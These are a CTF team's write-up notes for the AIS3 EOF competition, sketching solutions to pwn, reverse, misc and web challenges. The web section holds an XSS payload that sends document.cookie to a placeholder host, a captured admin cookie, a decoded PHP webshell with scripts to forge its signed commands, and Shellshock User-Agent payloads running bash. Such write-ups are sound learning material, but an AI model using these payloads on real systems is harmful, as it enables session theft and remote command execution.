# AIS3 EOF note


### Questions

#### Pwn
- [writeme](#writeme)
- [Bingo](#bingo)
- [MagicHeap2](#magicheap2)
#### Misc
- [Python2Easy](#Python2Easy)
#### Reverse
- [simple](#simple)
- [MOSburger](#mosbuger)
- [singlehell](#singlehell)
#### Web
- [xssme](#xssme)
- [webshell](#webshell)
- [command-executor](#command-executor)



---

### Pwn

#### writeme (康賴)
- leak ```puts@got``` and overwrite with ```one_gadget```


#### Bingo (康賴)
- using ```rand()``` withou seed
- 183,86,177,115,193,135,186,92,49,21,162,27,90,59,163,126
- 當```read_input```讀滿字元時不會補`\0`字元，可以leak stack資訊
- 先寫```read syscall```在stack上並且執行
- 在寫```execve syscall```

#### magicheap2 (Billy, 康賴) 
- shrink the chunk
- fastbin currupt at got
- leak and modify got

---

### Misc
#### Python2Easy (toosyou)
- leak pyc magic number
- 偽造 pyc
    - 前面 8 byte 需要照實複製 secret.pyc
    - 第二題直接開 shell
- **Done!**

---
### Reverse
#### simple
- 去系統設定環境變數 name = rockman
- 手動開啟 notepad
- 手動用 x64dbg 打開程式
    - 手動進入 ```(void*) XDDDD```
    - 在程式讀到 $name 後手動跳過 debug 檢查
    - 跑完在 notepad 看結果
- Done !

#### MOSburger
- find ```strcmp``` symbol
    - Enter ```money$```
- Open ```C://Users/*/AppData/local/temp/MOSburger.txt```
- Decode with Morse code, get flag!

#### singlehell
- [upx](https://github.com/upx/upx/releases/tag/v3.94) unpack
- run gdb script
    - modify self hp
    - modify attack damage
- see the flag at register




#### xssme(toosyou, 康賴)
- mail content can make ```XSS``` 
- <svg/onload='```script```'>
- Use ```UTF-8``` encode critical characters
- Done!
    - `admin_cookie = pbmmrhlsj7s8v23itionobr4q5`

```
// orgin payload script
function post_to_url(path, params, method) {
    method = method || "post"; // Set method to post by default, if not specified.

    // The rest of this code assumes you are not using a library.
    // It can be made less wordy if you use one.
    var form = document.createElement("form");
    form.setAttribute("method", method);
    form.setAttribute("action", path);

    for(var key in params) {
        var hiddenField = document.createElement("input");
        hiddenField.setAttribute("type", "hidden");
        hiddenField.setAttribute("name", key);
        hiddenField.setAttribute("value", params[key]);

        form.appendChild(hiddenField);
    }

    document.body.appendChild(form);    // Not entirely sure if this is necessary
    form.submit();
}

post_to_url('http://your.domain:8080', {'q':document.cookie});
```

#### webshell (billy)
- 網頁的source code的註解是把一串加密過的字串還原成後面的php檔案
- 變數查ascii表就知道是什麼function

##### 解出來的東西
```
function run() 
{ 
    if(isset($_GET['cmd']) && isset($_GET['sig'])) 
    { 
        $cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd']; 
        $key = $_SERVER['HTTP_USER_AGENT'] . sha1($_SERVER['HTTP_HOST']); 
        $sig = hash_hmac('SHA512', $cmd, $key); 
        if($sig === (string)$_GET['sig']) 
        { 
            header('Content-Type: text/plain');
            return !!system($cmd); 
        }
    } 
    return false; 
} 
function fuck() 
{ 
    print(str_repeat("\n", 4096));
    readfile($_SERVER['SCRIPT_FILENAME']); 
} 
run() ?: fuck();
```
- 然後寫個php去解出如果我要傳某個command需要的cmd和sig

get cmd:
```
<?php
if(isset($_GET['cmd'])){
	$cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd'];
	echo $_GET['cmd'];
	echo "<br> ".urlencode($cmd);
}
?>
```

get sig:
```
<?php
function run(){
	if(isset($_GET['cmd'])){
		$cmd = hash('SHA512', $_SERVER['REMOTE_ADDR']) ^ (string)$_GET['cmd'];
		$key = $_SERVER['HTTP_USER_AGENT'].sha1('webshell.eof-ctf.ais3.ntu.st');
		$sig = hash_hmac('SHA512', $cmd, $key);
		echo $sig;
		#echo "<br>cmd:".$cmd;
	}
	else{
		echo "<p>Input: ?cmd=...</p>";
	}
}
run();
?>
```

#### command-executer
- man那裏可以直接man檔案，由此得到一切的php檔案
- 不過如果man跟"/flag"有關的都會被擋
- 後來發現可以利用http header的user-agent執行shell command
- 用chrome的plugin去改http request header，改成：
```
() { : ;}; /bin/bash -c "cd /; cat flag-reader.c"
```
- 拿到source code以後，發現它要我們輸入一個一模一樣的random string才會印檔案給我們。
- 後來想到可以先把檔案寫到/tmp，之後去讀那個檔案就拿到flag了。
```
() { : ;}; /bin/bash -c "cd /; flag-reader flag > /tmp/file < /tmp/file"
```
ps: 一開始/tmp有給read權限所以看的到別人的檔案XD
